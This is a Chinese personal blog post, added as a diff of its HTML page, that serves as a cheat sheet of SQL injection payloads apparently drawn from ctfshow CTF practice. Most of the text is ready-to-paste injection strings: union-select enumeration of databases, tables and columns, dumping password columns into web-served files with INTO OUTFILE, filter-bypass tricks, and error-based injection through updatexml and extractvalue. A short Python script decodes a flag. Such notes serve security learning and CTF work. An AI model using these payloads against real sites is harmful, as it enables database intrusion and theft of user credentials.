@@ -1,0 +1,151 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="userq"><meta name="renderer" content="webkit"><meta name="copyright" content="userq"><meta name="keywords" content="MyBlog"><meta name="description" content="MyBlog"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>sql注入 · Mr.cheng's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
+</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">userq</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//https://1768161086.github.io/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.cheng's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">sql注入</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2025-01-29</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="sql注入"> sql注入</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><blockquote>
+<p>sql注入相关命令介绍</p>
+</blockquote>
+<h1 id="1-sql相关查询命令"><a href="#1-sql相关查询命令" class="headerlink" title="1.sql相关查询命令"></a>1.sql相关查询命令</h1><p>1.查询字段数：</p>
+<p>1’ order by 3#</p>
+<p>2.查询数据库信息：</p>
+<p>1’ union select user(),version(),database()#</p>
+<p>3.获取表名</p>
+<p>1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;’库名’</p>
+<p>4.获取列名</p>
+<p>1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’表名’</p>
+<p>5.查 库:select schema_name from information_schema.schema</p>
+<p>6.查 表： select table_name from information_schema.tables where table_schema&#x3D;库名</p>
+<p>7.查 列： select column_name from information_schema.columns where table_name&#x3D;表名</p>
+<p>8.查数据： select 列名 from 库名.表名</p>
+<p>（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 （2）version() 返回当前数据库的版本 </p>
+<p>（2）version() 返回当前数据库的版本 </p>
+<p>（3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 </p>
+<p>（4）group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 </p>
+<p>（5）@@datadir 数据库路径 </p>
+<p>（6）@@version_compile_os 操作系统版本</p>
+<h2 id="2-相关过滤绕过方法"><a href="#2-相关过滤绕过方法" class="headerlink" title="2.相关过滤绕过方法"></a>2.相关过滤绕过方法</h2><p>1.过滤数字：</p>
+<p>查询表名用字母替换0’ union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(table_name),’1’,’A’),’2’,’B’),’3’,’C’),’4’,’D’),’5’,’E’),’6’,’F’),’7’,’G’),’8’,’H’),’9’,’I’),’0’,’J’),’a’ from information_schema.tables where table_schema&#x3D;database()–+</p>
+<p>最后得出flag用脚本还原替换：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">origin = &#x27;ctfshow&#123;eIdGcBcc-cACA-DEIF-aGcB-aAJGdJddGBCe&#125;&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">repl = &#123;</span><br><span class="line">        &#x27;A&#x27;: &#x27;1&#x27;,</span><br><span class="line">        &#x27;B&#x27;: &#x27;2&#x27;,</span><br><span class="line">        &#x27;C&#x27;: &#x27;3&#x27;,</span><br><span class="line">        &#x27;D&#x27;: &#x27;4&#x27;,</span><br><span class="line">        &#x27;E&#x27;: &#x27;5&#x27;,</span><br><span class="line">        &#x27;F&#x27;: &#x27;6&#x27;,</span><br><span class="line">        &#x27;G&#x27;: &#x27;7&#x27;,</span><br><span class="line">        &#x27;H&#x27;: &#x27;8&#x27;,</span><br><span class="line">        &#x27;I&#x27;: &#x27;9&#x27;,</span><br><span class="line">        &#x27;J&#x27;: &#x27;0&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">for k, v in repl.items():</span><br><span class="line">    origin = origin.replace(k, v)</span><br><span class="line">flag += origin</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>2.过滤字母数字符号</p>
+<p>-1’ union select 1,group_concat(password) from ctfshow_user5 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt’ –+，之后访问flag.txt或者用脚本</p>
+<p>3.过滤空格</p>
+<p>可用&#x2F;**&#x2F;、%09、%0c.、0’or(id&#x3D;26)and’1’&#x3D;’1、（）。</p>
+<p>4.过滤#</p>
+<p>可用%23。注释可用–+或#或–%0c或 – -。</p>
+<p>5.&#x3D;号被过滤</p>
+<p>可以用like来绕过。</p>
+<p>6.substring与mid被过滤</p>
+<p>可以用right与left来绕过</p>
+<p>7.-1’ union select  username,password from ctfshow_user5 into outfile “&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt”–+：使用into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;‘将信息输入到文件中去，然后访问对应文件</p>
+<p>8.过滤 ‘ “ &#96;</p>
+<p>可用roght join绕过：tableName&#x3D;<code>ctfshow_user</code> as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(46))</p>
+<p>9.重命名字段</p>
+<p>rename table <code>words</code> to words2; </p>
+<p>10修改字段数据类型：</p>
+<p>alter table words change flag id varchar(100);</p>
+<p>11.union select被过滤</p>
+<p>可双写绕过：ununionion seselectlect </p>
+<h1 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h1><p>1.报错注入两个函数：</p>
+<p>（1）updatexml(xml_target, xpath_expr, new_xml)第一个参数：是string格式，为XML文档对象的名称。第二个参数：代表路径，Xpath格式的字符串。第三个参数：string格式，替换查找到的符合条件的数据。第二个参数跟extractvalue函数的第二个参数一样，因此也可利用且利用方式相同。</p>
+<p>（2）extractvalue(xml_frag, xpath_expr)接受两个字符串参数，一个XML标记片段xml_frag和一个XPath表达式xpath_expr（也称为定位器）；它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径。作用：从目标xml中返回包含所查询值的字符串</p>
+<p>2.区别：</p>
+<p>^可来更换or,然后不用updatexml()，而是使用：extractvalue()原理都是一样的。</p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://1768161086.github,io">userq</a></p><p> <span>Link:  </span><a href="http://1768161086.github,io/2025/01/29/sql%E6%B3%A8%E5%85%A5/">http://1768161086.github,io/2025/01/29/sql%E6%B3%A8%E5%85%A5/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2025/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传"><span>NextPost ></span><br><span class="nextTitle">文件上传</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-sql%E7%9B%B8%E5%85%B3%E6%9F%A5%E8%AF%A2%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">1.sql相关查询命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%9B%B8%E5%85%B3%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">2.相关过滤绕过方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">3.报错注入</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
